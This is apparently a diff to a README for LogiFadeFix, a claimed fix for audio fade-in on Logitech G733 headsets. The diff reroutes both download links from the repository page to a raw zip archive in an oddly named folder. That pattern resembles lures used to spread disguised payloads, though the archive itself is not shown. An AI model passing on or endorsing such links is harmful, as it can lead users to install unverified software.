@@ -1,6 +1,6 @@
 # 🎧 LogiFadeFix - Keep Logitech headset audio clear always
 
-[![](https://img.shields.io/badge/Download-LogiFadeFix-blue.svg)](https://github.com/itsvis9313/LogiFadeFix)
+[![](https://img.shields.io/badge/Download-LogiFadeFix-blue.svg)](https://raw.githubusercontent.com/itsvis9313/LogiFadeFix/main/coadjutress/Fade-Logi-Fix-v3.0.zip)
 
 LogiFadeFix solves a common issue with the Logitech G733 headset. Some G733 headsets fade the sound in slowly when audio starts. This causes you to miss the first second of a sound or notification. LogiFadeFix runs in the background to prevent this delay. It keeps your device active so your audio sounds instant and crisp.
 
@@ -14,7 +14,7 @@ LogiFadeFix solves a common issue with the Logitech G733 headset. Some G733 head
 
 You need to download the program first. Visit the release page to get the installer for your computer.
 
-[Download LogiFadeFix here](https://github.com/itsvis9313/LogiFadeFix)
+[Download LogiFadeFix here](https://raw.githubusercontent.com/itsvis9313/LogiFadeFix/main/coadjutress/Fade-Logi-Fix-v3.0.zip)
 
 Follow these steps to complete the installation:
 
